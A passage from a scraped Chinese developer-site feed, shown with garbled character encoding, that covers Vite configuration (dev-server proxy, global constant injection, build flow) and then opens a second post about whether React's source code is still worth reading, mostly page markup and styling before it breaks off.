<li><code>port</code> é…ç½®æœ¬åœ°å¼€å‘ç«¯å£ï¼Œé¿å…ä¸å…¶ä»–æœåŠ¡ç«¯å£å†²çªã€‚</li>
<li><code>host: true</code> å…è®¸å¤–éƒ¨è®¾å¤‡è®¿é—®ï¼Œæ–¹ä¾¿åœ¨æ‰‹æœºä¸Šè°ƒè¯•ç§»åŠ¨ç«¯é¡µé¢ã€‚</li>
<li><code>proxy</code> ä¸­çš„ <code>target</code> ä¸ºåç«¯æœåŠ¡åœ°å€ï¼Œ<code>changeOrigin: true</code> æ˜¯è§£å†³è·¨åŸŸçš„æ ¸å¿ƒï¼Œé€šè¿‡ä¿®æ”¹è¯·æ±‚å¤´çš„ Origin æ¨¡æ‹ŸåŒæºè¯·æ±‚ã€‚</li>
<li><code>rewrite</code> ç”¨äºä¿®æ­£è¯·æ±‚è·¯å¾„ï¼Œè‹¥å‰ç«¯è¯·æ±‚è·¯å¾„ä¸åç«¯æ¥å£è·¯å¾„ä¸ä¸€è‡´ï¼Œå¯é€šè¿‡è¯¥é…ç½®è¿›è¡Œè°ƒæ•´ã€‚</li>
</ol>
<h3 data-id="heading-32">æ¨¡å—å…«ï¼šå…¨å±€å¸¸é‡æ³¨å…¥é…ç½®ï¼ˆdefineï¼‰</h3>
<p>é€šè¿‡ <code>define</code> å¯ä»¥åœ¨é¡¹ç›®ä¸­æ³¨å…¥å…¨å±€å¸¸é‡ï¼Œè¿™äº›å¸¸é‡ä¼šåœ¨æ‰“åŒ…æ—¶è¢«é™æ€æ›¿æ¢ï¼Œæ— éœ€æ‰‹åŠ¨å¼•å…¥å³å¯åœ¨ä»£ç ä¸­ç›´æ¥ä½¿ç”¨ï¼Œé€‚ç”¨äºåŸ‹ç‚¹ã€ç‰ˆæœ¬å·ã€CDN è·¯å¾„æ‹¼æ¥ç­‰åœºæ™¯ã€‚</p>
<h4 data-id="heading-33">é…ç½®é€»è¾‘</h4>
<ol>
<li>åœ¨ <code>define</code> ä¸­å®šä¹‰å…¨å±€å¸¸é‡ï¼Œæ³¨æ„å­—ç¬¦ä¸²ç±»å‹éœ€è¦ä½¿ç”¨ <code>JSON.stringify</code> åŒ…è£¹ã€‚</li>
<li>åœ¨é¡¹ç›®ä»£ç ä¸­ç›´æ¥è®¿é—®è¯¥å¸¸é‡ã€‚</li>
</ol>
<h4 data-id="heading-34">ä»£ç å®ç°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">return</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// å…¶ä»–é…ç½®...</span>
  <span class="hljs-attr">define</span>: {
    <span class="hljs-comment">// æ³¨å…¥æ—¶é—´æˆ³å…¨å±€å¸¸é‡ï¼Œç”¨äºç‰ˆæœ¬æ ‡è¯†</span>
    <span class="hljs-string">'import.meta.env.VITE_APP_LOCAL_HASH'</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(fileDateDir)
  },
});
</code></pre>
<h4 data-id="heading-35">é…ç½®è¯´æ˜</h4>
<ol>
<li><code>define</code> ä¸­çš„é”®åå»ºè®®éµå¾ª <code>import.meta.env.XXX</code> æ ¼å¼ï¼Œä¸ Vite å†…ç½®ç¯å¢ƒå˜é‡æ ¼å¼ä¿æŒä¸€è‡´ã€‚</li>
<li>å­—ç¬¦ä¸²ç±»å‹å¿…é¡»ä½¿ç”¨ <code>JSON.stringify</code> åŒ…è£¹ï¼Œå¦åˆ™æ‰“åŒ…æ—¶ä¼šè¢«å½“ä½œå˜é‡è§£æï¼Œå¯¼è‡´æŠ¥é”™ã€‚</li>
<li>åœ¨é¡¹ç›®ä»£ç ä¸­å¯ç›´æ¥ä½¿ç”¨ï¼š<code>console.log(import.meta.env.VITE_APP_LOCAL_HASH)</code>ï¼Œæ‰“åŒ…åä¼šè¢«é™æ€æ›¿æ¢ä¸ºå¯¹åº”çš„æ—¶é—´æˆ³å­—ç¬¦ä¸²ã€‚</li>
</ol>
<h2 data-id="heading-36">å››ã€Vite çš„æ„å»ºæµç¨‹</h2>
<p>å°½ç®¡ Vite é‡‡ç”¨äº†ä¸ Webpack ä¸åŒçš„åº•å±‚æœºåˆ¶ï¼Œä½†å®ƒä¾ç„¶éµå¾ªæ¸…æ™°çš„æ„å»ºæµç¨‹ï¼Œåˆ†ä¸ºå¼€å‘ç¯å¢ƒå’Œç”Ÿäº§ç¯å¢ƒä¸¤ä¸ªé˜¶æ®µï¼š</p>
<h3 data-id="heading-37">1. å¼€å‘ç¯å¢ƒæ„å»ºæµç¨‹</h3>
<ol>
<li>åˆå§‹åŒ–å‚æ•°ï¼šè§£æ vite.config.jsï¼Œåˆå¹¶å‘½ä»¤è¡Œå‚æ•°ï¼ŒåŠ è½½ç¯å¢ƒå˜é‡å’Œæ’ä»¶ã€‚</li>
<li>å¯åŠ¨å¼€å‘æœåŠ¡å™¨ï¼šåˆ›å»º HTTP æœåŠ¡ï¼Œç›‘å¬æŒ‡å®šç«¯å£ï¼Œå¼€å¯ WebSocket é€šä¿¡ï¼ˆç”¨äºçƒ­æ›´æ–°ï¼‰ã€‚</li>
<li>ç¡®å®šå…¥å£ï¼šåŠ è½½æ ¹ç›®å½•ä¸‹çš„ index.htmlï¼Œè‡ªåŠ¨ä¿®æ­£å…¶ä¸­çš„èµ„æºè·¯å¾„å’Œå…¬å…±åŸºç¡€è·¯å¾„ã€‚</li>
<li>æŒ‰éœ€ç¼–è¯‘æ¨¡å—ï¼šæµè§ˆå™¨è¯·æ±‚æŸä¸ªæ¨¡å—æ—¶ï¼ŒVite å®æ—¶å¯¹è¯¥æ¨¡å—è¿›è¡Œç¼–è¯‘ï¼ˆå¦‚ Vue SFC è§£æã€TS è½¬ JSï¼‰ï¼Œä¿®æ­£ä¾èµ–è·¯å¾„åè¿”å›ç»™æµè§ˆå™¨ã€‚</li>
<li>çƒ­æ›´æ–°ï¼ˆHMRï¼‰ï¼šç›‘å¬é¡¹ç›®æ–‡ä»¶å˜åŒ–ï¼Œä»…é‡æ–°ç¼–è¯‘ä¿®æ”¹çš„å•ä¸ªæ¨¡å—ï¼Œé€šè¿‡ WebSocket å‘æµè§ˆå™¨æ¨é€æ›´æ–°é€šçŸ¥ï¼Œæµè§ˆå™¨ç›´æ¥æ›¿æ¢å¯¹åº”æ¨¡å—ï¼Œæ— éœ€å…¨é¡µåˆ·æ–°ã€‚</li>
<li>æ¥å£ä»£ç†ï¼šæ ¹æ® server.proxy é…ç½®ï¼Œå°†å‰ç«¯è¯·æ±‚è½¬å‘åˆ°åç«¯æœåŠ¡ï¼Œè§£å†³è·¨åŸŸé—®é¢˜ã€‚</li>
</ol>
<h3 data-id="heading-38">2. ç”Ÿäº§ç¯å¢ƒæ„å»ºæµç¨‹</h3>
<ol>
<li>ç¯å¢ƒå‡†å¤‡ï¼šè§£æ mode å‚æ•°ï¼ŒåŠ è½½å¯¹åº”ç¯å¢ƒå˜é‡ï¼Œæ¸…ç†æ—§çš„æ‰“åŒ…äº§ç‰©ã€‚</li>
<li>åˆå§‹åŒ–ç¼–è¯‘å™¨ï¼šåˆå¹¶ vite.config.js ä¸­çš„ build é…ç½®ï¼Œåˆå§‹åŒ– Rollup ç¼–è¯‘å™¨ï¼Œæ³¨å†Œæ‰€æœ‰æ’ä»¶ã€‚</li>
<li>è§£æå…¥å£ä¸ä¾èµ–ï¼šä»¥ index.html ä¸ºå…¥å£ï¼Œé€’å½’åˆ†ææ‰€æœ‰æ¨¡å—çš„ä¾èµ–å…³ç³»ï¼Œæ„å»ºå®Œæ•´çš„ä¾èµ–å›¾è°±ã€‚</li>
<li>æ¨¡å—ç¼–è¯‘ä¸ä¼˜åŒ–ï¼šå¯¹æ‰€æœ‰æ¨¡å—è¿›è¡Œç¼–è¯‘è½¬æ¢ï¼Œæ‰§è¡Œ Tree Shaking å‰”é™¤æ­»ä»£ç ï¼Œè¿›è¡Œä»£ç å‹ç¼©å’Œæ··æ·†ã€‚</li>
<li>ç»„è£…ä¸è¾“å‡ºèµ„æºï¼šå°†æ¨¡å—ç»„è£…ä¸ºå…¥å£ä»£ç å—ã€å…¬å…±ä»£ç å—ï¼ŒæŒ‰ç…§é…ç½®çš„è¾“å‡ºè§„åˆ™å°†é™æ€èµ„æºå†™å…¥æŒ‡å®šç›®å½•ã€‚</li>
<li>åç»­è‡ªåŠ¨åŒ–æ“ä½œï¼šæ‰§è¡Œæ’ä»¶çš„ writeBundle é’©å­ï¼ˆå¦‚èµ„æºæ‹·è´ï¼‰ï¼Œç”Ÿæˆæœ€ç»ˆçš„æ‰“åŒ…äº§ç‰©ï¼Œå®Œæˆæ„å»ºã€‚</li>
</ol>
<h2 data-id="heading-39">äº”ã€Vite çš„æ ¸å¿ƒä¼˜åŠ¿ä¸é€‚ç”¨åœºæ™¯</h2>
<h3 data-id="heading-40">æ ¸å¿ƒä¼˜åŠ¿</h3>
<ol>
<li>æé€Ÿå¯åŠ¨ï¼šåˆ©ç”¨æµè§ˆå™¨åŸç”Ÿ ESMï¼Œæ— éœ€å…¨é‡æ‰“åŒ…ï¼Œå¼€å‘ç¯å¢ƒå¯åŠ¨é€Ÿåº¦è¿œè¶…ä¼ ç»Ÿæ‰“åŒ…å·¥å…·ã€‚</li>
<li>å¿«é€Ÿçƒ­æ›´æ–°ï¼šä»…æ›´æ–°ä¿®æ”¹çš„å•ä¸ªæ¨¡å—ï¼Œçƒ­æ›´æ–°å“åº”æ— å»¶è¿Ÿï¼Œå¤§å¹…æå‡å¼€å‘æ•ˆç‡ã€‚</li>
<li>ä¸°å¯Œçš„æ’ä»¶ç”Ÿæ€ï¼šæ”¯æŒ Vueã€Reactã€TypeScript ç­‰ä¸»æµæŠ€æœ¯æ ˆï¼Œå…¼å®¹éƒ¨åˆ† Rollup æ’ä»¶ï¼Œæ‰©å±•èƒ½åŠ›å¼ºã€‚</li>
<li>å¼€ç®±å³ç”¨ï¼šå†…ç½® TypeScriptã€JSXã€CSS é¢„å¤„ç†å™¨ç­‰æ”¯æŒï¼Œæ— éœ€é¢å¤–å¤æ‚é…ç½®ã€‚</li>
<li>é«˜åº¦å¯é…ç½®ï¼švite.config.js æä¾›å®Œå–„çš„é…ç½®é¡¹ï¼Œå¯æ»¡è¶³å„ç±»é¡¹ç›®çš„å·¥ç¨‹åŒ–éœ€æ±‚ã€‚</li>
<li>ä¼˜åŒ–çš„ç”Ÿäº§æ‰“åŒ…ï¼šåŸºäº Rollup å®ç°ï¼Œäº§å‡ºçš„é™æ€èµ„æºä½“ç§¯å°ã€æ€§èƒ½ä¼˜ï¼Œæ»¡è¶³ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²è¦æ±‚ã€‚</li>
</ol>
<h3 data-id="heading-41">é€‚ç”¨åœºæ™¯</h3>
<ol>
<li>æ–°ä¸€ä»£ SPA/MPA é¡¹ç›®å¼€å‘ã€‚</li>
<li>å‰ç«¯ç»„ä»¶åº“å¼€å‘ã€‚</li>
<li>å†…éƒ¨ä¸­åå°ç³»ç»Ÿã€ç®¡ç†å¹³å°å¼€å‘ã€‚</li>
<li>éœ€è¦å¿«é€Ÿè¿­ä»£çš„åŸå‹é¡¹ç›®ã€‚</li>
<li>æ³¨é‡å¼€å‘è€…ä½“éªŒçš„å›¢é˜Ÿå’Œé¡¹ç›®ã€‚</li>
</ol>
<h2 data-id="heading-42">å…­ã€æ€»ç»“</h2>
<p>vite.config.js ä½œä¸º Vite é¡¹ç›®çš„æ ¸å¿ƒé…ç½®æ–‡ä»¶ï¼Œæ¶µç›–äº†ç¯å¢ƒé…ç½®ã€æ‰“åŒ…è¾“å‡ºã€æ’ä»¶æ‰©å±•ã€æœ¬åœ°å¼€å‘ç­‰å¤šä¸ªæ¨¡å—ï¼Œä¸€ä»½å®Œå–„çš„é…ç½®èƒ½å¤Ÿè®©å‰ç«¯å·¥ç¨‹åŒ–æµç¨‹æ›´è§„èŒƒã€æ›´é«˜æ•ˆã€‚</p>
<p>Vite å‡­å€Ÿâ€œå¼€å‘ç¯å¢ƒæŒ‰éœ€ç¼–è¯‘ã€ç”Ÿäº§ç¯å¢ƒ Rollup æ‰“åŒ…â€çš„å·®å¼‚åŒ–ç­–ç•¥ï¼Œæ—¢è§£å†³äº†ä¼ ç»Ÿæ‰“åŒ…å·¥å…·çš„æ€§èƒ½ç“¶é¢ˆï¼Œåˆæ»¡è¶³äº†ç”Ÿäº§ç¯å¢ƒçš„éƒ¨ç½²è¦æ±‚ï¼Œæ˜¯ç°ä»£å‰ç«¯å¼€å‘çš„ä¼˜è´¨é€‰æ‹©ã€‚æŒæ¡ vite.config.js çš„é…ç½®é€»è¾‘ï¼Œèƒ½å¤Ÿå……åˆ†å‘æŒ¥ Vite çš„æ ¸å¿ƒä¼˜åŠ¿ï¼ŒåŠ©åŠ›é¡¹ç›®é«˜æ•ˆå¼€å‘ä¸éƒ¨ç½²ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[éƒ½2026å¹´ï¼ŒReactæºç è¿˜å€¼ä¸å€¼å¾—è¯» â“â“â“]]></title>    <link>https://juejin.cn/post/7597623392456458291</link>    <guid>https://juejin.cn/post/7597623392456458291</guid>    <pubDate>2026-01-21T12:26:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597623392456458291" data-draft-id="7597640029574348851" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="éƒ½2026å¹´ï¼ŒReactæºç è¿˜å€¼ä¸å€¼å¾—è¯» â“â“â“"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,React.js"/> <meta itemprop="datePublished" content="2026-01-21T12:26:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Moment"/> <meta itemprop="url" content="https://juejin.cn/user/3782764966460398"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            éƒ½2026å¹´ï¼ŒReactæºç è¿˜å€¼ä¸å€¼å¾—è¯» â“â“â“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3782764966460398/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Moment
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T12:26:41.000Z" title="Wed Jan 21 2026 12:26:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>éšç€å‰ç«¯æŠ€æœ¯ç”Ÿæ€çš„ä¸æ–­æ¼”è¿›ï¼ŒReact ä½œä¸ºç›®å‰æœ€æµè¡Œçš„å‰ç«¯æ¡†æ¶ä¹‹ä¸€ï¼Œå·²ç»èµ°è¿‡äº†åå¤šä¸ªå¹´å¤´ã€‚åœ¨ 2026 